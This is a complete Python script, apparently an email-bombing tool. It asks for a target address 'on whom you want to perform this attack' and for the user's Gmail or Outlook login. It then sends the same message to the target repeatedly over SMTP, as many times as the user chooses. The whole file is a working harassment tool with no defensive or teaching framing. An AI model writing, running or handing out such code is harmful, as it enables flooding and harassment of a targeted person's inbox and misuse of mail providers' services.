import smtplib
import time

def send_email():
    try:
        bomb_email = input("Enter the email address on whom you want to perform this attack: ")
        email = input("Enter your Gmail address: ")
        password = input("Enter your Gmail password: ")
        message = input("Enter message: ")
        counter = int(input("How many messages do you want to send?: "))

        # Gmail or Outlook
        service_provider = input('Select the service provider (Gmail / Outlook): ').lower()

        if service_provider == "gmail":
            server = smtplib.SMTP('smtp.gmail.com', 587)
        elif service_provider == "outlook":
            server = smtplib.SMTP('smtp.office365.com', 587)
        else:
            print("Invalid service provider. Please choose either Gmail or Outlook.")
            return

        server.starttls()
        server.login(email, password)

        for x in range(counter):
            print("Number of messages sent:", x + 1)
            server.sendmail(email, bomb_email, message)
            time.sleep(1)

        server.quit()
        print("Emails sent successfully.")
    except Exception as e:
        print("Something went wrong. Please try again with valid inputs.")

if __name__ == "__main__":
    send_email()
